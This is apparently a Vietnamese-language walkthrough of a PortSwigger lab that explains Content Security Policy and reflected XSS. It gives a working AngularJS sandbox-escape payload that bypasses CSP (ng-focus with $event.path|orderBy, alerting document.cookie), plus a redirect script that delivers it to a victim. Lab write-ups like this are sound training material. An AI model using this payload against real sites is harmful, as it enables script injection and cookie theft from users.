# Reflected XSS with AngularJS sandbox escape and CSP

> Độ khó: Expert

Mô tả       

> This lab uses [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) and [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox).        
>
> To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that bypasses CSP, escapes the AngularJS sandbox, and alerts `document.cookie`.        

1.Step by step

Để giải quyết được bài này trước tiên chúng ta cần hiểu CSP (Content secutity policy) là gì, có thể đọc thêm thông tin [tại đây](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) và một số tips để bypass [tại đây](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass)

Về cơ bản nó là một cơ chế triển khai để chống các cuộc tấn công XSS, các tài nguyên có thể bao gồm image, iframe, javascript...

Ở lab này chúng ta thấy rằng sau khi tìm kiếm một chuỗi bất kì  như `<script>confirm()</script>` nó sẽ được reflected trong html, nhưng không thực thi code javascript do cơ chế bảo vệ khỏi xss, nhưng chưa mạnh nên vẫn có thể dễ dàng bypass

CSP được triển khai thông qua tiêu đề phản hồi:

![image](https://user-images.githubusercontent.com/68894302/172447507-b1969f69-ff84-4a89-b71e-ac08c5868f17.png)

+ **script-src** : Chỉ thị này chỉ định các nguồn được phép cho JavaScript. Điều này không chỉ bao gồm các URL được tải trực tiếp vào các phần tử mà còn bao gồm những thứ như trình xử lý sự kiện tập lệnh nội tuyến (onclick) và biểu định kiểu XSLT có thể kích hoạt thực thi tập lệnh. 
+ **default-src** : Chỉ thị này xác định chính sách tìm nạp (fetching) tài nguyên theo mặc định. Khi không có chỉ thị tìm nạp trong tiêu đề CSP, trình duyệt sẽ tuân theo chỉ thị này theo mặc định. 

​					=> Hai phần trên được gọi là các chỉ thị

+ **self** : Nguồn này xác định rằng việc tải các tài nguyên trên trang được phép từ cùng một miền. 

​					=> `self`: nguồn (resource)

=> Như vậy CSP đã chặn hết các sự kiện javascript qua `default-src 'self'` và `script-src 'self'` .

2.Khai thác

Tuy nhiên Angularjs có thể định nghĩa các sự kiện của riêng nó . Bên trong một sự kiện , AngularJS xác định một đối tượng `$event` chỉ đơn giản là tham chiếu đến đối tượng sự kiện của trình duyệt. Chúng ta có thể sử dụng đối tượng này để thực hiện bỏ qua CSP. 

Trên Chrome có một thuộc tính đặc biệt được goi là path, thuộc tính này chứa một mảng các đối tượng gây ra sự kiện được thực thi, `window` cuối cùng có thể được sử dụng để escape ra khỏi  sandbox. Sau đó chuyển mảng này đến bộ lọc `orderBy` chúng ta có thể liệt kê mảng và sử dụng `window` ddeer thực thi một hàm toàn cục, chẳng hạn như alert()

Đoạn code minh họa như sau

```
<input%20did=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
```

Sau khi encode

```
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Payload sau sẽ store bên web exploit của victim (trong challenge này là exploit server) sau đó deliver để kích hoạt nó

``` javascript
<script>document.location="https://ac011f101f01dfdec0e345f700170034.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x";
</script>
```

![image](https://user-images.githubusercontent.com/68894302/172451546-231b3b63-41a3-430b-a568-8cd19d4976cb.png)